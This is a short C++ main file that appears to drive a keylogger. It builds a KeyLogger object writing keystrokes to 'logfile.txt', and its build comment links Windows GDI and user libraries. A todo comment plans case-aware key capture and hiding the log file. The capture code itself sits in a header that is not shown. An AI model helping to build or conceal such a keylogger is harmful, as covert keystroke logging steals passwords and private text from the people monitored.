#include "KeyLogger.hpp"
#include <iostream>


// g++ *.cpp -o logger.exe -lgdi32 -luser32
/*
    @todo:

    - check for lower and upper case chars, also special like SHIFT2 -> @
    - make holding accurate
    / make file hidden
*/


int main()
{
    // Defining log file path
    std::string logFilePath = "logfile.txt";

    // Create instance of the KeyLogger
    KeyLogger keyLogger(logFilePath);

    // Run the instance
    keyLogger.run();
    return 0;
}